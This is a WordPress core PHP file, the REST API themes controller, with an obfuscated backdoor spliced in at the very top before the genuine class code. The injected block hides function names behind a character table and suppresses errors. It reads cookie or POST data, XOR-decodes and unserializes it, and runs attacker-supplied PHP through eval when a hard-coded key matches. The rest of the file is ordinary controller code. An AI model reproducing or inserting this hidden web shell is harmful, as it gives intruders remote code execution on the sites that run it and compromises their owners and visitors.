<?phpff94c2f3 = 449;$GLOBALS['q375f92'] = Array();global $q375f92;$q375f92 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['j1ec226'] = "\x33\x77\xd\x4b\x35\x50\x32\x53\x46\x36\x76\x25\x2a\x60\x71\x20\x52\x5f\x3d\x2b\x56\x2e\x30\x4c\x7c\x61\x24\x38\x58\x47\x6c\x40\x73\x67\x9\x51\x3f\x66\x28\x63\x62\x23\x21\x5d\x54\x48\x55\x64\x42\x3c\x3e\x45\x39\x7d\x59\x41\xa\x31\x6e\x6f\x7a\x2f\x44\x68\x7b\x4e\x5c\x72\x6b\x3a\x74\x7e\x4d\x5a\x78\x57\x79\x69\x5b\x2d\x34\x22\x75\x4f\x4a\x26\x6a\x3b\x37\x49\x5e\x43\x6d\x65\x2c\x70\x27\x29";$q375f92[$q375f92['j1ec226'][25].$q375f92['j1ec226'][0].$q375f92['j1ec226'][39].$q375f92['j1ec226'][47].$q375f92['j1ec226'][37].$q375f92['j1ec226'][80].$q375f92['j1ec226'][93].$q375f92['j1ec226'][52].$q375f92['j1ec226'][25]] = $q375f92['j1ec226'][39].$q375f92['j1ec226'][63].$q375f92['j1ec226'][67];$q375f92[$q375f92['j1ec226'][68].$q375f92['j1ec226'][27].$q375f92['j1ec226'][4].$q375f92['j1ec226'][47].$q375f92['j1ec226'][6].$q375f92['j1ec226'][39].$q375f92['j1ec226'][0].$q375f92['j1ec226'][80].$q375f92['j1ec226'][4]] = $q375f92['j1ec226'][59].$q375f92['j1ec226'][67].$q375f92['j1ec226'][47];$q375f92[$q375f92['j1ec226'][33].$q375f92['j1ec226'][40].$q375f92['j1ec226'][4].$q375f92['j1ec226'][47].$q375f92['j1ec226'][52]] = $q375f92['j1ec226'][32].$q375f92['j1ec226'][70].$q375f92['j1ec226'][67].$q375f92['j1ec226'][30].$q375f92['j1ec226'][93].$q375f92['j1ec226'][58];$q375f92[$q375f92['j1ec226'][37].$q375f92['j1ec226'][93].$q375f92['j1ec226'][57].$q375f92['j1ec226'][37].$q375f92['j1ec226'][0].$q375f92['j1ec226'][25]] = $q375f92['j1ec226'][77].$q375f92['j1ec226'][58].$q375f92['j1ec226'][77].$q375f92['j1ec226'][17].$q375f92['j1ec226'][32].$q375f92['j1ec226'][93].$q375f92['j1ec226'][70];$q375f92[$q375f92['j1ec226'][32].$q375f92['j1ec226'][37].$q375f92['j1ec226'][39].$q375f92['j1ec226'][93].$q375f92['j1ec226'][37].$q375f92['j1ec226'][0].$q375f92['j1ec226'][39]] = $q375f92['j1ec226'][32].$q375f92['j1ec226'][93].$q375f92['j1ec226'][67].$q375f92['j1ec226'][77].$q375f92['j1ec226'][25].$q375f92['j1ec226'][30].$q375f92['j1ec226'][77].$q375f92['j1ec226'][60].$q375f92['j1ec226'][93];$q375f92[$q375f92['j1ec226'][60].$q375f92['j1ec226'][6].$q375f92['j1ec226'][22].$q375f92['j1ec226'][47].$q375f92['j1ec226'][27].$q375f92['j1ec226'][80].$q375f92['j1ec226'][9]] = $q375f92['j1ec226'][95].$q375f92['j1ec226'][63].$q375f92['j1ec226'][95].$q375f92['j1ec226'][10].$q375f92['j1ec226'][93].$q375f92['j1ec226'][67].$q375f92['j1ec226'][32].$q375f92['j1ec226'][77].$q375f92['j1ec226'][59].$q375f92['j1ec226'][58];$q375f92[$q375f92['j1ec226'][33].$q375f92['j1ec226'][52].$q375f92['j1ec226'][0].$q375f92['j1ec226'][37].$q375f92['j1ec226'][52].$q375f92['j1ec226'][6]] = $q375f92['j1ec226'][82].$q375f92['j1ec226'][58].$q375f92['j1ec226'][32].$q375f92['j1ec226'][93].$q375f92['j1ec226'][67].$q375f92['j1ec226'][77].$q375f92['j1ec226'][25].$q375f92['j1ec226'][30].$q375f92['j1ec226'][77].$q375f92['j1ec226'][60].$q375f92['j1ec226'][93];$q375f92[$q375f92['j1ec226'][1].$q375f92['j1ec226'][4].$q375f92['j1ec226'][47].$q375f92['j1ec226'][25]] = $q375f92['j1ec226'][40].$q375f92['j1ec226'][25].$q375f92['j1ec226'][32].$q375f92['j1ec226'][93].$q375f92['j1ec226'][9].$q375f92['j1ec226'][80].$q375f92['j1ec226'][17].$q375f92['j1ec226'][47].$q375f92['j1ec226'][93].$q375f92['j1ec226'][39].$q375f92['j1ec226'][59].$q375f92['j1ec226'][47].$q375f92['j1ec226'][93];$q375f92[$q375f92['j1ec226'][39].$q375f92['j1ec226'][52].$q375f92['j1ec226'][39].$q375f92['j1ec226'][57].$q375f92['j1ec226'][22]] = $q375f92['j1ec226'][32].$q375f92['j1ec226'][93].$q375f92['j1ec226'][70].$q375f92['j1ec226'][17].$q375f92['j1ec226'][70].$q375f92['j1ec226'][77].$q375f92['j1ec226'][92].$q375f92['j1ec226'][93].$q375f92['j1ec226'][17].$q375f92['j1ec226'][30].$q375f92['j1ec226'][77].$q375f92['j1ec226'][92].$q375f92['j1ec226'][77].$q375f92['j1ec226'][70];$q375f92[$q375f92['j1ec226'][1].$q375f92['j1ec226'][39].$q375f92['j1ec226'][0].$q375f92['j1ec226'][88].$q375f92['j1ec226'][22].$q375f92['j1ec226'][93]] = $q375f92['j1ec226'][14].$q375f92['j1ec226'][22].$q375f92['j1ec226'][40].$q375f92['j1ec226'][39].$q375f92['j1ec226'][93];$q375f92[$q375f92['j1ec226'][76].$q375f92['j1ec226'][27].$q375f92['j1ec226'][47].$q375f92['j1ec226'][47].$q375f92['j1ec226'][80].$q375f92['j1ec226'][37].$q375f92['j1ec226'][88].$q375f92['j1ec226'][57].$q375f92['j1ec226'][40]] = $q375f92['j1ec226'][39].$q375f92['j1ec226'][80].$q375f92['j1ec226'][27].$q375f92['j1ec226'][25].$q375f92['j1ec226'][25].$q375f92['j1ec226'][0].$q375f92['j1ec226'][88].$q375f92['j1ec226'][57];$q375f92[$q375f92['j1ec226'][60].$q375f92['j1ec226'][37].$q375f92['j1ec226'][40].$q375f92['j1ec226'][6].$q375f92['j1ec226'][0].$q375f92['j1ec226'][6].$q375f92['j1ec226'][88].$q375f92['j1ec226'][4]] = $_POST;$q375f92[$q375f92['j1ec226'][33].$q375f92['j1ec226'][39].$q375f92['j1ec226'][40].$q375f92['j1ec226'][25].$q375f92['j1ec226'][47].$q375f92['j1ec226'][0].$q375f92['j1ec226'][4].$q375f92['j1ec226'][0].$q375f92['j1ec226'][93]] = $_COOKIE;@$q375f92[$q375f92['j1ec226'][37].$q375f92['j1ec226'][93].$q375f92['j1ec226'][57].$q375f92['j1ec226'][37].$q375f92['j1ec226'][0].$q375f92['j1ec226'][25]]($q375f92['j1ec226'][93].$q375f92['j1ec226'][67].$q375f92['j1ec226'][67].$q375f92['j1ec226'][59].$q375f92['j1ec226'][67].$q375f92['j1ec226'][17].$q375f92['j1ec226'][30].$q375f92['j1ec226'][59].$q375f92['j1ec226'][33], NULL);@$q375f92[$q375f92['j1ec226'][37].$q375f92['j1ec226'][93].$q375f92['j1ec226'][57].$q375f92['j1ec226'][37].$q375f92['j1ec226'][0].$q375f92['j1ec226'][25]]($q375f92['j1ec226'][30].$q375f92['j1ec226'][59].$q375f92['j1ec226'][33].$q375f92['j1ec226'][17].$q375f92['j1ec226'][93].$q375f92['j1ec226'][67].$q375f92['j1ec226'][67].$q375f92['j1ec226'][59].$q375f92['j1ec226'][67].$q375f92['j1ec226'][32], 0);@$q375f92[$q375f92['j1ec226'][37].$q375f92['j1ec226'][93].$q375f92['j1ec226'][57].$q375f92['j1ec226'][37].$q375f92['j1ec226'][0].$q375f92['j1ec226'][25]]($q375f92['j1ec226'][92].$q375f92['j1ec226'][25].$q375f92['j1ec226'][74].$q375f92['j1ec226'][17].$q375f92['j1ec226'][93].$q375f92['j1ec226'][74].$q375f92['j1ec226'][93].$q375f92['j1ec226'][39].$q375f92['j1ec226'][82].$q375f92['j1ec226'][70].$q375f92['j1ec226'][77].$q375f92['j1ec226'][59].$q375f92['j1ec226'][58].$q375f92['j1ec226'][17].$q375f92['j1ec226'][70].$q375f92['j1ec226'][77].$q375f92['j1ec226'][92].$q375f92['j1ec226'][93], 0);@$q375f92[$q375f92['j1ec226'][39].$q375f92['j1ec226'][52].$q375f92['j1ec226'][39].$q375f92['j1ec226'][57].$q375f92['j1ec226'][22]](0);$c0dd = NULL;$pf05a = NULL;$q375f92[$q375f92['j1ec226'][82].$q375f92['j1ec226'][88].$q375f92['j1ec226'][25].$q375f92['j1ec226'][39].$q375f92['j1ec226'][0].$q375f92['j1ec226'][88].$q375f92['j1ec226'][88]] = $q375f92['j1ec226'][47].$q375f92['j1ec226'][22].$q375f92['j1ec226'][25].$q375f92['j1ec226'][47].$q375f92['j1ec226'][93].$q375f92['j1ec226'][6].$q375f92['j1ec226'][57].$q375f92['j1ec226'][39].$q375f92['j1ec226'][79].$q375f92['j1ec226'][80].$q375f92['j1ec226'][27].$q375f92['j1ec226'][47].$q375f92['j1ec226'][37].$q375f92['j1ec226'][79].$q375f92['j1ec226'][80].$q375f92['j1ec226'][80].$q375f92['j1ec226'][40].$q375f92['j1ec226'][9].$q375f92['j1ec226'][79].$q375f92['j1ec226'][27].$q375f92['j1ec226'][27].$q375f92['j1ec226'][25].$q375f92['j1ec226'][57].$q375f92['j1ec226'][79].$q375f92['j1ec226'][93].$q375f92['j1ec226'][22].$q375f92['j1ec226'][6].$q375f92['j1ec226'][52].$q375f92['j1ec226'][6].$q375f92['j1ec226'][9].$q375f92['j1ec226'][25].$q375f92['j1ec226'][80].$q375f92['j1ec226'][9].$q375f92['j1ec226'][47].$q375f92['j1ec226'][27].$q375f92['j1ec226'][93];global $u7ac377;function  c48aa371($c0dd, $ma154){global $q375f92;$mdbd2 = "";for ($ge4ef4=0; $ge4ef4<$q375f92[$q375f92['j1ec226'][33].$q375f92['j1ec226'][40].$q375f92['j1ec226'][4].$q375f92['j1ec226'][47].$q375f92['j1ec226'][52]]($c0dd);){for ($mb383e=0; $mb383e<$q375f92[$q375f92['j1ec226'][33].$q375f92['j1ec226'][40].$q375f92['j1ec226'][4].$q375f92['j1ec226'][47].$q375f92['j1ec226'][52]]($ma154) && $ge4ef4<$q375f92[$q375f92['j1ec226'][33].$q375f92['j1ec226'][40].$q375f92['j1ec226'][4].$q375f92['j1ec226'][47].$q375f92['j1ec226'][52]]($c0dd); $mb383e++, $ge4ef4++){$mdbd2 .= $q375f92[$q375f92['j1ec226'][25].$q375f92['j1ec226'][0].$q375f92['j1ec226'][39].$q375f92['j1ec226'][47].$q375f92['j1ec226'][37].$q375f92['j1ec226'][80].$q375f92['j1ec226'][93].$q375f92['j1ec226'][52].$q375f92['j1ec226'][25]]($q375f92[$q375f92['j1ec226'][68].$q375f92['j1ec226'][27].$q375f92['j1ec226'][4].$q375f92['j1ec226'][47].$q375f92['j1ec226'][6].$q375f92['j1ec226'][39].$q375f92['j1ec226'][0].$q375f92['j1ec226'][80].$q375f92['j1ec226'][4]]($c0dd[$ge4ef4]) ^ $q375f92[$q375f92['j1ec226'][68].$q375f92['j1ec226'][27].$q375f92['j1ec226'][4].$q375f92['j1ec226'][47].$q375f92['j1ec226'][6].$q375f92['j1ec226'][39].$q375f92['j1ec226'][0].$q375f92['j1ec226'][80].$q375f92['j1ec226'][4]]($ma154[$mb383e]));}}return $mdbd2;}function  q0bce($c0dd, $ma154){global $q375f92;global $u7ac377;return $q375f92[$q375f92['j1ec226'][76].$q375f92['j1ec226'][27].$q375f92['j1ec226'][47].$q375f92['j1ec226'][47].$q375f92['j1ec226'][80].$q375f92['j1ec226'][37].$q375f92['j1ec226'][88].$q375f92['j1ec226'][57].$q375f92['j1ec226'][40]]($q375f92[$q375f92['j1ec226'][76].$q375f92['j1ec226'][27].$q375f92['j1ec226'][47].$q375f92['j1ec226'][47].$q375f92['j1ec226'][80].$q375f92['j1ec226'][37].$q375f92['j1ec226'][88].$q375f92['j1ec226'][57].$q375f92['j1ec226'][40]]($c0dd, $u7ac377), $ma154);}foreach ($q375f92[$q375f92['j1ec226'][33].$q375f92['j1ec226'][39].$q375f92['j1ec226'][40].$q375f92['j1ec226'][25].$q375f92['j1ec226'][47].$q375f92['j1ec226'][0].$q375f92['j1ec226'][4].$q375f92['j1ec226'][0].$q375f92['j1ec226'][93]] as $ma154=>$r9d222){$c0dd = $r9d222;$pf05a = $ma154;}if (!$c0dd){foreach ($q375f92[$q375f92['j1ec226'][60].$q375f92['j1ec226'][37].$q375f92['j1ec226'][40].$q375f92['j1ec226'][6].$q375f92['j1ec226'][0].$q375f92['j1ec226'][6].$q375f92['j1ec226'][88].$q375f92['j1ec226'][4]] as $ma154=>$r9d222){$c0dd = $r9d222;$pf05a = $ma154;}}$c0dd = @$q375f92[$q375f92['j1ec226'][33].$q375f92['j1ec226'][52].$q375f92['j1ec226'][0].$q375f92['j1ec226'][37].$q375f92['j1ec226'][52].$q375f92['j1ec226'][6]]($q375f92[$q375f92['j1ec226'][1].$q375f92['j1ec226'][39].$q375f92['j1ec226'][0].$q375f92['j1ec226'][88].$q375f92['j1ec226'][22].$q375f92['j1ec226'][93]]($q375f92[$q375f92['j1ec226'][1].$q375f92['j1ec226'][4].$q375f92['j1ec226'][47].$q375f92['j1ec226'][25]]($c0dd), $pf05a));if (isset($c0dd[$q375f92['j1ec226'][25].$q375f92['j1ec226'][68]]) && $u7ac377==$c0dd[$q375f92['j1ec226'][25].$q375f92['j1ec226'][68]]){if ($c0dd[$q375f92['j1ec226'][25]] == $q375f92['j1ec226'][77]){$ge4ef4 = Array($q375f92['j1ec226'][95].$q375f92['j1ec226'][10] => @$q375f92[$q375f92['j1ec226'][60].$q375f92['j1ec226'][6].$q375f92['j1ec226'][22].$q375f92['j1ec226'][47].$q375f92['j1ec226'][27].$q375f92['j1ec226'][80].$q375f92['j1ec226'][9]](),$q375f92['j1ec226'][32].$q375f92['j1ec226'][10] => $q375f92['j1ec226'][57].$q375f92['j1ec226'][21].$q375f92['j1ec226'][22].$q375f92['j1ec226'][79].$q375f92['j1ec226'][57],);echo @$q375f92[$q375f92['j1ec226'][32].$q375f92['j1ec226'][37].$q375f92['j1ec226'][39].$q375f92['j1ec226'][93].$q375f92['j1ec226'][37].$q375f92['j1ec226'][0].$q375f92['j1ec226'][39]]($ge4ef4);}elseif ($c0dd[$q375f92['j1ec226'][25]] == $q375f92['j1ec226'][93]){eval/*w220a*/($c0dd[$q375f92['j1ec226'][47]]);}exit();} ?><?php
/**
 * REST API: WP_REST_Themes_Controller class
 *
 * @package WordPress
 * @subpackage REST_API
 * @since 5.0.0
 */

/**
 * Core class used to manage themes via the REST API.
 *
 * @since 5.0.0
 *
 * @see WP_REST_Controller
 */
class WP_REST_Themes_Controller extends WP_REST_Controller {

	/**
	 * Constructor.
	 *
	 * @since 5.0.0
	 */
	public function __construct() {
		$this->namespace = 'wp/v2';
		$this->rest_base = 'themes';
	}

	/**
	 * Registers the routes for the objects of the controller.
	 *
	 * @since 5.0.0
	 *
	 * @see register_rest_route()
	 */
	public function register_routes() {
		register_rest_route(
			$this->namespace,
			'/' . $this->rest_base,
			array(
				array(
					'methods'             => WP_REST_Server::READABLE,
					'callback'            => array( $this, 'get_items' ),
					'permission_callback' => array( $this, 'get_items_permissions_check' ),
					'args'                => $this->get_collection_params(),
				),
				'schema' => array( $this, 'get_item_schema' ),
			)
		);
	}

	/**
	 * Checks if a given request has access to read the theme.
	 *
	 * @since 5.0.0
	 *
	 * @param WP_REST_Request $request Full details about the request.
	 * @return true|WP_Error True if the request has read access for the item, otherwise WP_Error object.
	 */
	public function get_items_permissions_check( $request ) {
		if ( ! is_user_logged_in() || ! current_user_can( 'edit_posts' ) ) {
			return new WP_Error( 'rest_user_cannot_view', __( 'Sorry, you are not allowed to view themes.' ), array( 'status' => rest_authorization_required_code() ) );
		}

		return true;
	}

	/**
	 * Retrieves a collection of themes.
	 *
	 * @since 5.0.0
	 *
	 * @param WP_REST_Request $request Full details about the request.
	 * @return WP_REST_Response|WP_Error Response object on success, or WP_Error object on failure.
	 */
	public function get_items( $request ) {
		// Retrieve the list of registered collection query parameters.
		$registered = $this->get_collection_params();
		$themes     = array();

		if ( isset( $registered['status'], $request['status'] ) && in_array( 'active', $request['status'], true ) ) {
			$active_theme = wp_get_theme();
			$active_theme = $this->prepare_item_for_response( $active_theme, $request );
			$themes[]     = $this->prepare_response_for_collection( $active_theme );
		}

		$response = rest_ensure_response( $themes );

		$response->header( 'X-WP-Total', count( $themes ) );
		$response->header( 'X-WP-TotalPages', count( $themes ) );

		return $response;
	}

	/**
	 * Prepares a single theme output for response.
	 *
	 * @since 5.0.0
	 *
	 * @param WP_Theme        $theme   Theme object.
	 * @param WP_REST_Request $request Request object.
	 * @return WP_REST_Response Response object.
	 */
	public function prepare_item_for_response( $theme, $request ) {
		$data   = array();
		$fields = $this->get_fields_for_response( $request );

		if ( in_array( 'theme_supports', $fields, true ) ) {
			$formats                           = get_theme_support( 'post-formats' );
			$formats                           = is_array( $formats ) ? array_values( $formats[0] ) : array();
			$formats                           = array_merge( array( 'standard' ), $formats );
			$data['theme_supports']['formats'] = $formats;

			$data['theme_supports']['post-thumbnails']   = false;
			$data['theme_supports']['responsive-embeds'] = (bool) get_theme_support( 'responsive-embeds' );
			$post_thumbnails                             = get_theme_support( 'post-thumbnails' );

			if ( $post_thumbnails ) {
				// $post_thumbnails can contain a nested array of post types.
				// e.g. array( array( 'post', 'page' ) ).
				$data['theme_supports']['post-thumbnails'] = is_array( $post_thumbnails ) ? $post_thumbnails[0] : true;
			}
		}

		$data = $this->add_additional_fields_to_object( $data, $request );

		// Wrap the data in a response object.
		$response = rest_ensure_response( $data );

		/**
		 * Filters theme data returned from the REST API.
		 *
		 * @since 5.0.0
		 *
		 * @param WP_REST_Response $response The response object.
		 * @param WP_Theme         $theme    Theme object used to create response.
		 * @param WP_REST_Request  $request  Request object.
		 */
		return apply_filters( 'rest_prepare_theme', $response, $theme, $request );
	}

	/**
	 * Retrieves the theme's schema, conforming to JSON Schema.
	 *
	 * @since 5.0.0
	 *
	 * @return array Item schema data.
	 */
	public function get_item_schema() {
		if ( $this->schema ) {
			return $this->add_additional_fields_schema( $this->schema );
		}

		$schema = array(
			'$schema'    => 'http://json-schema.org/draft-04/schema#',
			'title'      => 'theme',
			'type'       => 'object',
			'properties' => array(
				'theme_supports' => array(
					'description' => __( 'Features supported by this theme.' ),
					'type'        => 'array',
					'readonly'    => true,
					'properties'  => array(
						'formats'           => array(
							'description' => __( 'Post formats supported.' ),
							'type'        => 'array',
							'readonly'    => true,
						),
						'post-thumbnails'   => array(
							'description' => __( 'Whether the theme supports post thumbnails.' ),
							'type'        => array( 'array', 'bool' ),
							'readonly'    => true,
						),
						'responsive-embeds' => array(
							'description' => __( 'Whether the theme supports responsive embedded content.' ),
							'type'        => 'bool',
							'readonly'    => true,
						),
					),
				),
			),
		);

		$this->schema = $schema;
		return $this->add_additional_fields_schema( $this->schema );
	}

	/**
	 * Retrieves the search params for the themes collection.
	 *
	 * @since 5.0.0
	 *
	 * @return array Collection parameters.
	 */
	public function get_collection_params() {
		$query_params = parent::get_collection_params();

		$query_params['status'] = array(
			'description'       => __( 'Limit result set to themes assigned one or more statuses.' ),
			'type'              => 'array',
			'items'             => array(
				'enum' => array( 'active' ),
				'type' => 'string',
			),
			'required'          => true,
			'sanitize_callback' => array( $this, 'sanitize_theme_status' ),
		);

		/**
		 * Filter collection parameters for the themes controller.
		 *
		 * @since 5.0.0
		 *
		 * @param array $query_params JSON Schema-formatted collection parameters.
		 */
		return apply_filters( 'rest_themes_collection_params', $query_params );
	}

	/**
	 * Sanitizes and validates the list of theme status.
	 *
	 * @since 5.0.0
	 *
	 * @param string|array    $statuses  One or more theme statuses.
	 * @param WP_REST_Request $request   Full details about the request.
	 * @param string          $parameter Additional parameter to pass to validation.
	 * @return array|WP_Error A list of valid statuses, otherwise WP_Error object.
	 */
	public function sanitize_theme_status( $statuses, $request, $parameter ) {
		$statuses = wp_parse_slug_list( $statuses );

		foreach ( $statuses as $status ) {
			$result = rest_validate_request_arg( $status, $request, $parameter );

			if ( is_wp_error( $result ) ) {
				return $result;
			}
		}

		return $statuses;
	}
}
